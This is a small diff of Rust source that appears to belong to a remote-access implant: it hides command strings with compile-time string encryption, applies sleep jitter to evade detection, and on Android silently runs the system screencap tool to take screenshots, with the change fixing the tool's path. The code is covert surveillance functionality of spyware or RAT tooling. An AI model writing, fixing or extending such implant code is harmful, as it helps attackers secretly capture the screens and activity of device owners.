@@ -249,7 +249,7 @@ Available commands:
             obfuscate::sleep_jitter_default();
             #[cfg(target_os = "android")]
             let encoded = {
-                let output = std::process::Command::new(cryptify::encrypt_string!("screencap"))
+                let output = std::process::Command::new(cryptify::encrypt_string!("/system/bin/screencap"))
                     .arg(cryptify::encrypt_string!("-p"))
                     .output()
                     .context(cryptify::encrypt_string!("Failed to run screencap"))?;
